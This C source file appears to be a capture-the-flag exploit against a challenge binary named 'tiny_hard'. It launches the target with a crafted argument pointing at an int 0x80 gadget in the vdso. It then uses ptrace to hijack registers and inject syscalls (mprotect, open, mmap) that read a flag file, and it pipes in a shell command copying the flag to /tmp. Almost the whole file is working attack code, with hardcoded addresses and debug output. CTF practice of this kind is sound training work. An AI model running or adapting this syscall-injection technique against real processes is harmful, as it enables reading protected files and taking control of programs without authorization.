#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h>

#define VDSO_START (0xf7755000) // changes due to ASLR, low entropy. Example start
#define int80_offest (0xb57) // remote offset to int 0x80 gadget on the vdso
#define INT80 (0xf7742b57)
// 0xf7742b57
int run_mmap(pid_t pid, int syscall_number, int first_paramter, 
	int second_parameter, int third_paramter, int fourth_parameter,
	 int fifth_parameter, int sixth_parameter)
{
	struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    regs.esi = fourth_parameter;
    regs.edi = fifth_parameter;
    regs.ebp = sixth_parameter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}
int run_syscall(pid_t pid, int syscall_number, int first_paramter, int second_parameter, int third_paramter) {
    struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

char address[] = { 0x57, 0x2b, 0x74, 0xf7 }; // another legit address
char *ARG = "/bin/sh";
char exploit[] = "cat /home/tiny_hard/flag_is_in_here > /tmp/itay_tiny_hard/FLAG\n";

void run_bash_with_ptrace(pid_t pid) {
//printf("Parents starts waiting..\n");
int status;
wait(&status);
//printf("Wait status: %d\n", status);
if (status < 200)
{return;
}
// printf("Now doing second wait....\n");
    
//	wait(&status);
//printf("Parent done waiting, Status: %d\n");
struct user_regs_struct regs = { 0 };
//struct user_regs_struct regs2;
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
if (regs.eip == 0xf7742b59){
	printf("BINGOOOOOOOOOOOOOOOOO\n\n\n\n\n\nBINGO\n");
} 
    printf("Registers values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);
	printf("EIP points to:\n");
	long text = ptrace(PTRACE_PEEKTEXT, pid, regs.eip, 0);
printf("text: %p\n", text);

regs.eip = 0x08048074;
regs.eax = 11;
regs.ebx = regs.esp;
regs.ecx = regs.esp;
regs.edx = regs.esp;
ptrace(PTRACE_SETREGS, pid, 0, &regs);
ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
wait(&status);

ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]Single stepped..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);


run_syscall(pid, 125, 0x8048000, 0x1000, 7);
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]Syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

/*
ptrace(PTRACE_POKETEXT, pid, 0x8048320, 0x6e69622f); // write /bin/sh
ptrace(PTRACE_POKETEXT, pid, 0x8048320 + 4, 0x0068732f);
ptrace(PTRACE_POKETEXT, pid, 0x8048350, 0x8048320); // write ecx = argv
ptrace(PTRACE_POKETEXT, pid, 0x8048350 + 4, 0);
 
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("Almost calling exec..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nEBX:%08x\nECX:%08x\nEDX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.ebx, regs.ecx, regs.edx, regs.esp, regs.ebp, regs.eip);

run_syscall(pid, 11, 0x8048320, 0x8048350, 0); // exec
wait(&status);
printf("Done with exec..status:%d\n", status);
printf("errno: %d\n", errno);
*/

ptrace(PTRACE_POKETEXT, pid, 0x8048200, 0x6d6f682f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 4, 0x69742f65);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 8, 0x685f796e);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 12, 0x2f647261); // changed 61->60
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 16, 0x67616c66);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 20, 0x5f73695f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 24, 0x685f6e69);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 28, 0x00657265);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 32, 0x00000000);
run_syscall(pid, 5, 0x8048200, O_RDONLY, 0); // Open
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
int flag_fd = regs.eax;
printf("Open syscall worked, flag fd: %d\n", flag_fd);
printf("[*]Syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

run_mmap(pid, 90, 0x66661111, 0x1000, 1, 1, flag_fd, 0);
printf("[*]mmap Syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);
printf("Errno: %d\n", errno);
/*
run_syscall(pid, 3, flag_fd, 0x8048400, 52); // Read
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("read %d bytes\n",  regs.eax);

printf("errno: %d\n", errno);
*/

long flag = ptrace(PTRACE_PEEKTEXT, pid, 0x66661111, 0);
printf("text: %p\n", flag);


}

void main(void) {

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return;
    }
	pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

	if (0 == pid) {
    close(pipefd[1]);
 	dup2(pipefd[0], 0);
    //printf("[*] Child entered\n");
        execl("/home/tiny_hard/tiny_hard", address, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, NULL);
        perror("execl");
    }
else {
close(pipefd[0]);
write(pipefd[1], exploit, sizeof(exploit));	
//printf("[*] Parent entered. Child pid: %d\n", pid);
        run_bash_with_ptrace(pid);
    }
}